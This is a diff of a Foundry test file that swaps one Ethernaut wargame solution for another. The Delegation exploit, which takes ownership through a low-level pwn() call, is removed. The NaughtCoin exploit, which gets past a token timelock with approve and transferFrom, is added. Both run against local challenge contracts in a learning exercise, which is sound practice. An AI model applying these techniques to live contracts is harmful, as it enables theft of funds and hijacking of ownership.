@@ -1,14 +1,13 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-// testing functionalities
 import "forge-std/Test.sol";
 
 // Ethernaut game components
-import "src/core/Ethernaut.sol";
-import "src/levels/06-Delegation/DelegationFactory.sol";
+import {Ethernaut} from "src/core/Ethernaut-08.sol";
+import {NaughtCoinFactory, NaughtCoin} from "src/levels/15-NaughtCoin/NaughtCoinFactory.sol";
 
-contract DelegationTest is Test {
+contract NaughtCoinTest is Test {
     /*//////////////////////////////////////////////////////////////
                             GAME INSTANCE SETUP
     //////////////////////////////////////////////////////////////*/
@@ -17,9 +16,10 @@ contract DelegationTest is Test {
 
     /// @dev eve is the attacker
     address eve = makeNameForAddress("eve");
+    address bob = makeNameForAddress("bob");
 
     function setUp() public {
-        emit log_string("Setting up Delegation level...");
+        emit log_string("Setting up NaughtCoin level...");
         ethernaut = new Ethernaut();
     }
 
@@ -27,39 +27,45 @@ contract DelegationTest is Test {
                 LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
     //////////////////////////////////////////////////////////////*/
 
-    function test_DelegationExploit() public {
+    function test_NaughtCoinExploit() public {
         /*//////////////////////////////////////////////////////////////
                             LEVEL INSTANCE SETUP
         //////////////////////////////////////////////////////////////*/
 
-        DelegationFactory delegationFactory = new DelegationFactory();
+        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
 
-        ethernaut.registerLevel(delegationFactory);
+        ethernaut.registerLevel(naughtCoinFactory);
+
         vm.startPrank(eve);
+        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
 
-        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
-        Delegation delegationContract = Delegation(levelAddress);
+        NaughtCoin naughtCoinContract = NaughtCoin(levelAddress);
 
-        emit log_named_address("Eve's address: ", address(eve));
-        emit log_named_address("Original owner of the Delegation contract: ", address(delegationContract.owner()));
+        emit log_string("Starting the exploit...");
+        emit log_named_address("Eve's address", eve);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        emit log_string("Starting the exploit... 🧨");
-        emit log_string("Making a low-level call to the Delegation contract...");
+        naughtCoinContract.approve(
+            eve,
+            naughtCoinContract.balanceOf(address(eve))
+        );
 
-        (bool success,) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
-        require(success, "Transaction failed");
-
-        emit log_named_address("Ownership transferred to: ", address(delegationContract.owner()));
+        naughtCoinContract.transferFrom(
+            address(eve),
+            address(bob),
+            naughtCoinContract.balanceOf(eve)
+        );
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
+        bool challengeCompleted = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -77,7 +83,9 @@ contract DelegationTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
+        address addr = address(
+            uint160(uint256(keccak256(abi.encodePacked(name))))
+        );
         vm.label(addr, name);
         return addr;
     }
